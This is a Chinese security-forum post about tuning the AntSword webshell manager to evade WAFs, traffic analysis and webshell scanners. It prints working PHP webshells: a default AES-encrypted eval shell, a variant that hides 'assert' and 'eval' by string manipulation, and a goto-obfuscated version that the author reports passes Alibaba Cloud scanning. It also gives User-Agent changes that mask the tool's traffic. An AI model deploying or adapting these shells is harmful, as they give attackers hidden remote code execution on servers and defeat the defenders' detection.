AntSword
========

0x00 前言：
--------

为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。  
但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。

0x01 蚁剑介绍及其改编：
--------------

关于蚁剑的介绍，这里就不多说了，一个连接webshell的管理器，使用前端nodejs进行编码。AntSword给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种webshell的变换。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-0a82e563e491ece7552fc6dc1018d193cd60730f.png)  
但是，蚁剑默认的编码器和菜刀都是一样的，这里用burpsuite来进行抓包看下流量。

#### 蚁剑默认流量

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-54e087b0fde3151bf8ae5a93d07a8e1ec83a142c.png)  
返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行waf的绕过，先选用最默认的base64进行测试。

#### 默认的base64编码器

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-93748b3aff08e85b4d193217806d45c1357e891d.png)  
但是看到了使用base64编码之后是有eval字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。

#### 去github上找到蚁剑的编码器和对应的解码器

github地址:（[编码器](https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php)）  
这里下载默认的aes-128的默认流量。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4601855137ce11ccf52639c6a1fb8c3059d51f76.png)  
默认编码器的webshell

```php
<?php
@session_start();
$pwd='ant';
$key=@substr(str_pad(session_id(),16,'a'),0,16);
@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));
?>
```

##### 默认webshell讲解：

```php
这里打开session_start，然后截取Cookie中的PHPSESSION的16位。
然后进行aes加密，密码为pwd
```

再D盾，河马和阿里云进行扫描：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4e3ba6ff5a86202b06cefe1f2fdc5612bb001ae3.png)  
河马没有查出来，可能是比较弱  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-411a48641a7f57721e7aa3c782e923bbb9472587.png)  
阿里云直接报恶意

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7f98d5afba2f4dc643dffa139212c77be3c26d97.png)

#### 初步修改后的webshell：

```php
<?php
@session_start();
error_reporting(E_ALL^E_NOTICE^E_WARNING);
function decode($key,$data){
$data_new = '';
for($i=0;$i<=strlen($data);$i++){
$b=$data[$i]^$key;
$data_new = $data_new.urldecode($b);
}
define('ass',$data_new[0].strrev($data_new)[2].strrev($data_new)[2].$data_new[11].strrev($data_new)[4].strrev($data_new)[0]);
define('ev',$data_new[11].strrev($data_new)[8].$data_new[0].strrev($data_new)[6].'($result)');
return $data_new;
}
function decrypto($key,$data){
$data = base64_decode($data);
$result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);
decode('\\','=:=om>n?o8h9i:j;k*d0e.l/m(');
$ass=ass;
$ass(ev);
}
class run{
    public $data;
    public function __construct(){
$this->data = '#````````#'.$_POST[1]."#`#`#";
$this->data = $this->data."123456";
}
}
$key=@substr(str_pad(session_id(),16,'a'),0,16);
$run = new run();
decrypto($key,$run->data);
?>
```

这里能过去D盾，但是无法绕过阿里云查杀。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-eff03d60d976593936e0ad0e2b92352adc7afcd9.png)  
所以这里还需要进行代码混淆。（这也是之后webshell免杀常常用到的）

#### 混淆之后的webshell：

这里提供php在线加密的站

```php
https://enphp.djunny.com/
```

这里加密之后生成webshell。如下：

```php
 goto Zc4oD; UJih6: function decrypto($key, $data) { goto LBrqg; P6YrI: $ass = ass; goto aR6yN; svn0O: $result = openssl_decrypt($data, "\x41\x45\x53\x2d\x31\x32\70\55\105\x43\x42", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); goto ATbMy; LBrqg: $data = base64_decode($data); goto svn0O; ATbMy: decode("\x5c", "\75\72\x3d\157\x6d\x3e\x6e\x3f\x6f\x38\x68\71\151\x3a\x6a\x3b\x6b\x2a\x64\x30\x65\56\x6c\57\155\50"); goto P6YrI; aR6yN: $ass(ev); goto k6RVH; k6RVH: } goto DGZMG; WvjFi: ini_set("\144\151\x73\160\x6c\x61\x79\x5f\145\162\x72\x6f\162\x73", "\117\146\x66"); goto Wguwk; DGZMG: class run { public $data; public function __construct() { $this->data = "\43\140\x60\140\140\x60\140\x60\x60\43" . $_POST[1] . "\x23\140\x23\140\43"; } } goto Berxy; UUYvT: $run = new run(); goto apKNY; Berxy: $key = @substr(str_pad(session_id(), 16, "\141"), 0, 16); goto UUYvT; Zc4oD: @session_start(); goto WvjFi; Wguwk: function decode($key, $data) { goto LGJR3; Ef77S: $i = 0; goto KvZGg; rSTXM: define("\141\x73\x73", $data_new[0] . strrev($data_new)[2] . strrev($data_new)[2] . $data_new[11] . strrev($data_new)[4] . strrev($data_new)[0]); goto TQ6r4; Tbglr: return $data_new; goto FsE2S; tm2qt: goto I39OV; goto eF7jG; AqTZZ: $data_new = $data_new . urldecode($b); goto FriN_; TQ6r4: define("\x65\166", $data_new[11] . strrev($data_new)[8] . $data_new[0] . strrev($data_new)[6] . "\50\x24\x72\145\163\165\154\x74\51"); goto Tbglr; FriN_: bLexq: goto gITff; eF7jG: RuTl1: goto rSTXM; gITff: $i++; goto tm2qt; KdSCg: if (!($i <= strlen($data))) { goto RuTl1; } goto d9N4J; d9N4J: $b = $data[$i] ^ $key; goto AqTZZ; LGJR3: $data_new = ''; goto Ef77S; KvZGg: I39OV: goto KdSCg; FsE2S: } goto UJih6; apKNY: decrypto($key, $run->data);
```

经过加密之后，可以发现，进行了goto的混淆，所以这里就达到了代码混淆。因为之前绕过了D盾和河马，这里直接去阿里云查杀。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8c29bea699a223eec48b3e45e05088f66d0790fc.png)  
已经成功绕过阿里云查杀。用burpsuite抓下流量特征。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-77560ad7feadea54e04b7b70b81036171ff24a78.png)  
从流量加密来分析的话，已经能绕过态势感知和全流量分析机。

### 蚁剑UA头的修改：

#### 在burp的数据包中能清楚的看到蚁剑的特征

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3034ef2a238786efbb09f2f1dea96a082dad330f.png)

#### 在目录/modules/request.js文件中修改UA头

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a9fa6d53837e759bb5cc34c21bdab23b3328795b.png)

#### /modules/update.js文件修改

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ec910b44405624877aa3e24d3bd95d0138c63d1d.png)

0x03 总结：
========

关于免杀来说，通常是进行代码加密混淆，特征码替换或者分割传输等情况。之前有想写过shellcode免杀，但是还没有过windows defender，所以就推迟一段时间来写。感谢各位拜读。